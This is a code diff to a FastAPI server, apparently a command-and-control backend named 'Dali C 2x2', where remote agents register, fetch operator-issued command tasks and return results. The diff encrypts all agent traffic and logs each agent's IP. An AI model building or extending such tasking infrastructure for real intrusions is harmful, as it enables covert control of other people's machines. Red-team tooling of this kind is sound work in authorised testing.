@@ -17,6 +17,7 @@ from fastapi.security import OAuth2PasswordRequestForm
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from shared.schemas import Task
+from shared.crypto import encrypt_payload, decrypt_payload
 from .store import DataStore
 
 app = FastAPI(title="Dali C 2x2")
@@ -109,27 +110,50 @@ async def get_agent_tasks_history(agent_id: str, user: str = Depends(get_current
     return tasks
 
 @app.post("/register")
-async def register_agent(agent_id: str, request: Request, info: dict = None, version: str = "1.0.0"):
+async def register_agent(request: Request):
+    # Decrypt incoming registration data
+    encrypted_body = await request.json()
+    data = decrypt_payload(encrypted_body.get("data", ""))
+    
+    agent_id = data.get("agent_id")
+    info = data.get("info", {})
+    version = data.get("version", "1.0.0")
+    
     # Capture the client's IP address
     client_ip = request.client.host
-    if info is None:
-        info = {}
     info["ip"] = client_ip
     
     store.register_agent(agent_id, info=info, version=version)
     await manager.broadcast({"event": "agent_registered", "agent_id": agent_id})
-    return {"status": "registered", "agent_id": agent_id}
+    return {"data": encrypt_payload({"status": "registered", "agent_id": agent_id})}
 
-@app.get("/tasks/{agent_id}", response_model=List[Task])
+@app.get("/tasks/{agent_id}")
 async def get_tasks(agent_id: str):
     tasks = store.get_pending_tasks(agent_id)
-    return [Task(id=t.id, type=t.type, payload=t.payload, expires_at=t.expires_at) for t in tasks]
+    task_list = [t.id for t in tasks] # Example
+    # We need the full task details for the agent
+    payload = []
+    for t in tasks:
+        payload.append({
+            "id": t.id,
+            "type": t.type,
+            "payload": t.payload,
+            "expires_at": t.expires_at.isoformat()
+        })
+    
+    return {"data": encrypt_payload({"tasks": payload})}
 
 @app.post("/tasks/{agent_id}/results")
-async def submit_result(agent_id: str, task_id: str, result: dict):
+async def submit_result(agent_id: str, request: Request):
+    encrypted_body = await request.json()
+    data = decrypt_payload(encrypted_body.get("data", ""))
+    
+    task_id = data.get("task_id")
+    result = data.get("result")
+    
     store.update_task_result(task_id, result)
     await manager.broadcast({"event": "task_updated", "agent_id": agent_id, "task_id": task_id})
-    return {"status": "received"}
+    return {"data": encrypt_payload({"status": "received"})}
 
 @app.post("/operator/tasks")
 async def create_task(agent_id: str, task_type: str, command: str, expires_minutes: int = 60, user: str = Depends(get_current_user)):
